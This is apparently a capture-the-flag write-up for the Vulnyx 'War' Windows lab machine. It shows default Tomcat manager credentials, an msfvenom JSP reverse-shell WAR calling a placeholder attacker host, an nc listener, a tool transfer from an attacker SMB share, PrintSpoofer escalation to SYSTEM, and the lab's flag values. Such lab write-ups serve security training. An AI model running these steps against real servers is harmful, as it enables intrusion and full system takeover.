# Vulnyx: War

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `msfvenom` · `nc` · `impacket-smbserver` · `PrintSpoofer` |
| **Tags** | `#DefaultCreds` `#Tomcat` `#RCE` `#SeImpersonatePrivilege` `#PotatoAttack` |
| **URL** | https://vulnyx.com/machines/ |

A Tomcat instance is found running with its default `admin:tomcat` credentials. Tomcat's manager app accepts `.war` file deployments, which is enough to get a JSP reverse shell running with the service account's privileges. That account holds `SeImpersonatePrivilege`, which `PrintSpoofer` abuses to coerce a SYSTEM-level token and escalate directly.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn war.nyx

PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 128
139/tcp   open  netbios-ssn   syn-ack ttl 128
445/tcp   open  microsoft-ds  syn-ack ttl 128
5040/tcp  open  unknown       syn-ack ttl 128
8080/tcp  open  http-proxy    syn-ack ttl 128
49664/tcp open  unknown       syn-ack ttl 128
49665/tcp open  unknown       syn-ack ttl 128
49666/tcp open  unknown       syn-ack ttl 128
49667/tcp open  unknown       syn-ack ttl 128
49668/tcp open  unknown       syn-ack ttl 128
49669/tcp open  unknown       syn-ack ttl 128
49670/tcp open  unknown       syn-ack ttl 128
MAC Address: 08:00:27:E7:4A:FD (Oracle VirtualBox virtual NIC)
```

A version and script scan on the open ports fills in the details — a typical Windows spread of RPC/SMB ports, plus Tomcat on 8080:

```bash
$ sudo nmap -p 135,139,445,5040,8080,49664,49665,49666,49667,49668,49669,49670 -sCV war.nyx

PORT      STATE  SERVICE       VERSION
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
5040/tcp  closed unknown
8080/tcp  open   http          Apache Tomcat (language: en)
|_http-title: Apache Tomcat/11.0.1
|_http-favicon: Apache Tomcat
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
49670/tcp open   msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:E7:4A:FD (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h59m57s
| smb2-time:
|   date: 2026-07-23T20:49:17
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WAR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:e7:4a:fd (Oracle VirtualBox virtual NIC)
```

### Web Enumeration

```
http://war.nyx:8080
```

<img src="../Images/war/Pasted image 20260721224641.png"/>

This is a Tomcat instance, and its manager interface is worth trying default credentials against:

> **Default credentials:** `admin:tomcat`

<img src="../Images/war/Pasted image 20260721224709.png"/>
<img src="../Images/war/Pasted image 20260721204253.png"/>

They work, granting access to the manager app — which includes the ability to deploy new web applications directly.

## Initial Access

### WAR Deployment → RCE

Tomcat's manager accepts `.war` files as application deployments, and a `.war` packaging a JSP reverse shell runs with whatever privileges the Tomcat service itself has:

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war -o rev_shell.war
Payload size: 1087 bytes
Final size of war file: 1087 bytes
Saved as: rev_shell.war
```

<img src="../Images/war/Pasted image 20260721204443.png"/>

The resulting `rev_shell.war` is uploaded through the Tomcat Manager's "WAR file to deploy" form and deployed under its own context path, `/rev_shell` — matching the filename minus the extension, as Tomcat does by default when no context path is specified.

Requesting the deployed app triggers the shell:

```
http://war.nyx:8080/rev_shell
```

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [war.nyx] 53207
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 11.0> whoami
whoami
nt authority\local service
```

## Privilege Escalation

### SeImpersonatePrivilege → PrintSpoofer

```cmd
C:\Program Files\Apache Software Foundation\Tomcat 11.0> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name               Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeSystemtimePrivilege         Change the system time                   Disabled
SeShutdownPrivilege           Shut down the system                     Disabled
SeAuditPrivilege              Generate security audits                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

> **Privileges:** `SeImpersonatePrivilege`

Service accounts commonly hold this privilege, and it's the basis for the whole "Potato" family of Windows privilege escalation techniques: it lets the current process impersonate any token it can get its hands on, and several Windows services can be coerced into authenticating as SYSTEM over a local named pipe — at which point that SYSTEM token becomes available to impersonate.

```cmd
C:\> systeminfo
systeminfo

Host Name:                 WAR
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19045 N/A Build 19045
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          low
Registered Organization:
Product ID:                00330-80000-00000-AA319
Original Install Date:     12/6/2024, 3:52:25 AM
System Boot Time:          7/21/2026, 9:28:07 PM
System Manufacturer:       innotek GmbH
System Model:               VirtualBox
System Type:                x64-based PC
Processor(s):               1 Processor(s) Installed.
                             [01]: Intel64 Family 6 Model 78 Stepping 3 GenuineIntel ~2808 Mhz
BIOS Version:                innotek GmbH VirtualBox, 12/1/2006
Windows Directory:           C:\Windows
System Directory:            C:\Windows\system32
Boot Device:                 \Device\HarddiskVolume1
System Locale:                en-us;English (United States)
Input Locale:                 en-us;English (United States)
Time Zone:                    (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:        2,048 MB
Available Physical Memory:    1,001 MB
Virtual Memory: Max Size:     3,200 MB
Virtual Memory: Available:    2,121 MB
Virtual Memory: In Use:       1,079 MB
Page File Location(s):        C:\pagefile.sys
Domain:                        WORKGROUP
Logon Server:                  N/A
Hotfix(s):                     6 Hotfix(s) Installed.
                                [01]: KB5022502
                                [02]: KB5015684
                                [03]: KB5020683
                                [04]: KB5026361
                                [05]: KB5014032
                                [06]: KB5025315

Network Card(s):               1 NIC(s) Installed.
                                [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                      Connection Name: Ethernet
                                      DHCP Enabled:    Yes
                                      DHCP Server:     10.0.2.3
                                      IP address(es)
                                      [01]: war.nyx
Hyper-V Requirements:          A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

`PrintSpoofer` — one implementation of this technique, targeting the Print Spooler service specifically — has to reach the box. An SMB server on the attacker machine hosts it, and the target pulls it down:

```bash
# Attacker Machine
$ impacket-smbserver smb . -smb2support
```

```cmd
# Victim Machine
C:\> cd %TEMP%
C:\> copy \\<ATTACKER_IP>\smb\PrintSpoofer64.exe PrintSpoofer64.exe
```

```cmd
C:\Windows\SERVIC~1\LOCALS~1\AppData\Local\Temp> dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 380E-880B

 Directory of C:\Windows\SERVIC~1\LOCALS~1\AppData\Local\Temp

07/21/2026  09:49 PM    <DIR>          .
07/21/2026  09:49 PM    <DIR>          ..
07/21/2026  09:28 PM    <DIR>          hsperfdata_LOCAL SERVICE
12/07/2021  05:57 AM            27,136 PrintSpoofer64.exe
               1 File(s)         27,136 bytes
               3 Dir(s)  32,622,452,736 bytes free
```

Running it spawns a new process with an impersonated SYSTEM token:

```cmd
C:\Windows\SERVIC~1\LOCALS~1\AppData\Local\Temp>.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
whoami
nt authority\system
```

With a SYSTEM shell, both flags are readable — `low`'s `user.txt` and the Administrator's `root.txt`:

```cmd
C:\Windows\system32> dir C:\Users
dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is 380E-880B

 Directory of C:\Users

12/06/2024  02:11 PM    <DIR>          .
12/06/2024  02:11 PM    <DIR>          ..
12/06/2024  02:21 PM    <DIR>          Administrator
12/06/2024  05:00 AM    <DIR>          low
12/06/2024  04:58 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  32,622,415,872 bytes free
```

```cmd
C:\Windows\system32> type C:\Users\low\Desktop\user.txt
type C:\Users\low\Desktop\user.txt
3a1ddb915bd423f0ca428dce35612dcb
```

> **User flag:** `3a1ddb915bd423f0ca428dce35612dcb`

```cmd
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
1399d5ba705df14146335def4ff64520
```

> **Root flag:** `1399d5ba705df14146335def4ff64520`

## Takeaways

- Default credentials on management interfaces (Tomcat's `admin:tomcat` included) are still worth trying first — the manager app itself doubles as a deployment mechanism, so getting in is often equivalent to getting code execution.
- `SeImpersonatePrivilege` on a service account is close to an automatic path to SYSTEM; tools like `PrintSpoofer`, `GodPotato`, and others exist specifically because this privilege is so commonly left enabled on services that don't need it.
- The privilege a compromised service holds matters more than which service it is — the JSP shell itself just runs code; what makes escalation trivial here is the token the Tomcat service account was already carrying.